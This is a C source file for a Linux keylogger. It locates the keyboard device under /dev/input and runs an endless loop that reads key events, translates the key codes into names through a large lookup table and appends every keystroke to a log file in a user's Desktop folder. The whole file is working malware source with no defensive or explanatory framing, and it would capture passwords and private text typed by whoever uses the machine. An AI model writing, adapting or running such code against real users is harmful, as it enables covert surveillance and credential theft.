#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>

#define LOGFILE "/home/n0bita/Desktop/key.log"
#define INPUT_DIR "/dev/input/"
#define LOGFILE "/home/n0bita/Desktop/key.log"

static int is_char_device(const struct dirent *file){
	struct stat filestat;
	char filename[512];
	int err;

	snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, file->d_name);

	err = stat(filename, &filestat);
	if(err){
		return 0;
	}

	return S_ISCHR(filestat.st_mode);
}

char *get_keyboard_event_file(void){
	char *keyboard_file = NULL;
	int num, i;
	struct dirent **event_files;
	char filename[512];

	num = scandir(INPUT_DIR, &event_files, &is_char_device, &alphasort);
	if(num < 0){
		return NULL;
	}

	else{
		for(i = 0; i < num; ++i){
			int32_t event_bitmap = 0;
			int fd;
			int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

			snprintf(filename, sizeof(filename), "%s%s", INPUT_DIR, event_files[i]->d_name);
			fd = open(filename, O_RDONLY);

			if(fd == -1){
				perror("open");
				continue;
			}

			ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
			if((EV_KEY & event_bitmap) == EV_KEY){
				ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
				if((kbd_bitmap & event_bitmap) == kbd_bitmap){
					keyboard_file = strdup(filename);
					close(fd);
					break;
				}
			}
			
			close(fd);
		}
	}

	// Cleanup scandir
	for(i = 0; i < num; ++i){
		free(event_files[i]);
	}

	free(event_files);

	return keyboard_file;
}

int main(int argc, char **argv){
	char *KEYBOARD_DEVICE = get_keyboard_event_file();
	struct input_event ev;
	int fd = open(KEYBOARD_DEVICE, O_RDONLY);
	FILE *fp = fopen(LOGFILE, "a");
	char dict[255][255] = {"<REVERSED>", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>", "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<ENTER>", "<LEFT CTRL>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<LEFT SHIFT>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<RIGHT SHIFT>", "*", "<LEFT ALT>", " ", "<CAPSLOCK>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>", "<NUMLOCK>", "<SCROLLLOCK>", "7", "8>", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "", "<KEY_ZENKAKUHANKAKU>", "<KEY_102ND>", "<F11>", "<F12>", "<KEY_RO>", "<KEY_KATAKANA>", "<KEY_HIRAGANA>", "<KEY_HENKAN>", "<KEY_KATAKANAHIRAGANA>", "<KEY_MUHENKAN>", "<KEY_KPJPCOMMA>", "<ENTER>", "<RIGHT CTRL>", "/", "<KEY_SYSRQ>", "<RIGHT ALT>", "<KEY_LINEFEED>", "<KEY_HOME>", "<KEY_UP>", "<KEY_PAGEUP>", "<LEFT>", "<RIGHT>", "<KEY_END>", "<KEY_DOWN>", "<KEY_PAGEDOWN>", "<KEY_INSERT>", "<KEY_DELETE>", "<KEY_MACRO>", "<KEY_MUTE>", "<KEY_VOLUMEDOWN>", "<KEY_VOLUMEUP>", "<KEY_POWER>", "<KEY_KPEQUAL>","<KEY_KPPLUSMINUS>","<KEY_PAUSE>","<KEY_SCALE>","<KEY_KPCOMMA>","<KEY_HANGEUL>","<KEY_HANJA>","<KEY_YEN>","<KEY_LEFTMETA>","<KEY_RIGHTMETA>","<KEY_COMPOSE>","<KEY_STOP>","<KEY_AGAIN>","<KEY_PROPS>","<KEY_UNDO>","<KEY_FRONT>","<KEY_COPY>","<KEY_OPEN>","<KEY_PASTE>","<KEY_FIND>","<KEY_CUT>","<KEY_HELP>","<KEY_MENU>","<KEY_CALC>","<KEY_SETUP>","<KEY_SLEEP>","<KEY_WAKEUP>","<KEY_FILE>","<KEY_SENDFILE>","<KEY_DELETEFILE>","<KEY_XFER147>","<KEY_PROG1>","<KEY_PROG2>","<KEY_WWW>","<KEY_MSDOS>","<KEY_COFFEE>","<KEY_ROTATE_DISPLAY>","<KEY_CYCLEWINDOWS>","<KEY_MAIL>","<KEY_BOOKMARKS>","<KEY_COMPUTER>","<KEY_BACK>","<KEY_FORWARD>","<KEY_CLOSECD>","<KEY_EJECTCD>","<KEY_EJECTCLOSECD>","<KEY_NEXTSONG>","<KEY_PLAYPAUSE>","<KEY_PREVIOUSSONG>","<KEY_STOPCD>","<KEY_RECORD>","<KEY_REWIND>","<KEY_PHONE>","<KEY_ISO>","<KEY_CONFIG>","<KEY_HOMEPAGE>","<KEY_REFRESH>","<KEY_EXIT>","<KEY_MOVE>","<KEY_EDIT>","<KEY_SCROLLUP>","<KEY_SCROLLDOWN>","<KEY_KPLEFTPAREN>","<KEY_KPRIGHTPAREN>","<KEY_NEW>","<KEY_REDO>","<KEY_F13>","<KEY_F14>","<KEY_F15>","<KEY_F16>","<KEY_F17>","<KEY_F18>","<KEY_F19>","<KEY_F20>","<KEY_F21>","<KEY_F22>","<KEY_F23>","<KEY_F24>", "", "", "", "", "", "<KEY_PLAYCD>","<KEY_PAUSECD>","<KEY_PROG3>","<KEY_PROG4>","<KEY_ALL_APPLICATIONS>","<KEY_SUSPEND>","<KEY_CLOSE>","<KEY_PLAY>","<KEY_FASTFORWARD>","<KEY_BASSBOOST>","<KEY_PRINT>","<KEY_HP>","<KEY_CAMERA>","<KEY_SOUND>","<KEY_QUESTION>","<KEY_EMAIL>","<KEY_CHAT>","<KEY_SEARCH>","<KEY_CONNECT>","<KEY_FINANCE>","<KEY_SPORT>","<KEY_SHOP>","<KEY_ALTERASE>","<KEY_CANCEL>","<KEY_BRIGHTNESSDOWN>","<KEY_BRIGHTNESSUP>","<KEY_MEDIA>","<KEY_SWITCHVIDEOMODE>","<KEY_KBDILLUMTOGGLE>","<KEY_KBDILLUMDOWN>","<KEY_KBDILLUMUP>","<KEY_SEND>","<KEY_REPLY>","<KEY_FORWARDMAIL>","<KEY_SAVE>","<KEY_DOCUMENTS>","<KEY_BATTERY>","<KEY_BLUETOOTH>","<KEY_WLAN>","<KEY_UWB>","<KEY_UNKNOWN>","<KEY_VIDEO_NEXT>","<KEY_VIDEO_PREV>","<KEY_BRIGHTNESS_CYCLE>","<KEY_BRIGHTNESS_AUTO>","<KEY_DISPLAY_OFF>","<KEY_WWAN>","<KEY_RFKILL>","<KEY_MICMUTE>"};

	while(1){
		read(fd, &ev, sizeof(ev));
		if((ev.type == EV_KEY) && (ev.value == 0)){
			fflush(fp);
			fprintf(fp, "%s", dict[ev.code]);
		}
	}
}
